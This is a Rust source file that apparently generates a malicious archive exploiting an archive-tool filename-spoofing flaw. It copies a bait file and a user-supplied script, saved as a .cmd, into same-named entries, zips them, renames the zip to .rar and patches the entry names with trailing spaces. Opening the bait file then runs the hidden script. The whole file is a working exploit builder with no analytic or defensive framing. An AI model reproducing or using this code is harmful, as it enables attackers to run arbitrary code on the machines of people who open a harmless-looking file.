use std::error::Error;
use std::fs::File;
use std::io;
use std::fs;
use std::io::Read;
use std::io::Write;
use std::path::Path;
use zip::{write::FileOptions, ZipWriter};


fn main() -> Result<(), Box<dyn Error>> {
    //Input Parameters
    let mut script_file = String::new();
    let mut target_file = String::new();

    println!("[-] Enter script file name: ");
    let _ = io::stdin().read_line(&mut script_file).expect("Error. Enter a valid script file name.");
    script_file = script_file.trim().to_string();

    println!("[-] Enter target file name: ");
    let _ = io::stdin().read_line(&mut target_file).expect("Error. Enter a valid script file name.");
    target_file = target_file.trim().to_string();
    
    //Extract file extension
    let parts: Vec<&str> = target_file.split('.').collect();
    let bait_ext = format!(".{}", parts.last().unwrap_or(&""));

    //Remove build folder
    if fs::metadata("OUTPUT").is_ok() {
        let _ = fs::remove_dir_all("OUTPUT");
    }
    let _ = fs::remove_file("OUTPUT.zip");

    //Create required folders
    let _ = fs::create_dir("OUTPUT");
    let _ = fs::create_dir(format!("OUTPUT/{}A", &target_file));

    let _ = copy_file(&target_file, &format!("OUTPUT/{}B", target_file));
    let _ = copy_file(&script_file, &format!("OUTPUT/{}A/{}A.cmd", target_file, target_file));

    println!("[-] File copied successfully.");

    //Create zip archive
    let zip_filename = format!("{}.zip", "OUTPUT");
    let file = File::create(&zip_filename)?;
    let mut zip = ZipWriter::new(file);

    let options = FileOptions::default().unix_permissions(0o755);
    let _ = copy_directory_contents_to_zip("OUTPUT", "OUTPUT", &mut zip, &options);

    zip.finish()?;

    //Rename zip & Patch bytes
    let _ = fs::rename("OUTPUT.zip", "OUTPUT.rar");

    let mut x = 0;
    if replace_bytes("OUTPUT.rar", &format!("{}A", bait_ext), &format!("{} ", bait_ext)).is_ok(){
        x += 1;
    }
    if replace_bytes("OUTPUT.rar", &format!("{}B", bait_ext), &format!("{} ", bait_ext)).is_ok(){
        x += 1;
    }

    if x==2 {
        println!("[!] Succesfully patched! Output file: OUTPUT.rar")
    }
    else{
        println!("[x] Error patching files.");
    }

    Ok(())
}


fn replace_bytes(filename: &str, from_str: &str, to_str: &str) -> Result<(), Box<dyn Error>> {
    let mut file_content = Vec::new();
    {
        let mut file = File::open(filename)?;
        file.read_to_end(&mut file_content)?;
    }

    let from_bytes = from_str.as_bytes();
    let to_bytes = to_str.as_bytes();

    let mut i = 0;
    while i + from_bytes.len() <= file_content.len() {
        if &file_content[i..i + from_bytes.len()] == from_bytes {
            file_content.splice(i..i + from_bytes.len(), to_bytes.iter().cloned());
            i += to_bytes.len();
        } else {
            i += 1;
        }
    }

    let mut file = File::create(filename)?;
    file.write_all(&file_content)?;

    Ok(())
}


fn copy_directory_contents_to_zip<P>(
    dir_path: P,
    base_dir: P,
    zip_writer: &mut ZipWriter<File>,
    options: &FileOptions,
) -> Result<(), Box<dyn Error>>
where
    P: AsRef<Path>,
{
    for entry in fs::read_dir(dir_path.as_ref())? {
        let entry = entry?;
        let path = entry.path();
        let rel_path = path.strip_prefix(base_dir.as_ref())?;

        if path.is_dir() {
            zip_writer.add_directory(rel_path.to_str().unwrap_or_default(), *options)?;
            copy_directory_contents_to_zip(path, base_dir.as_ref().to_path_buf(), zip_writer, options)?;
        } else if path.is_file() {
            let file_name = rel_path.to_str().unwrap_or_default();
            zip_writer.start_file(file_name, *options)?;
            let mut file = File::open(path)?;
            let mut buffer = Vec::new();
            file.read_to_end(&mut buffer)?;
            zip_writer.write_all(&buffer)?;
        }
    }
    Ok(())
}


fn copy_file(source_file: &str, destination_file: &str) -> io::Result<()> {
    fs::copy(source_file, destination_file).unwrap();
    Ok(())
}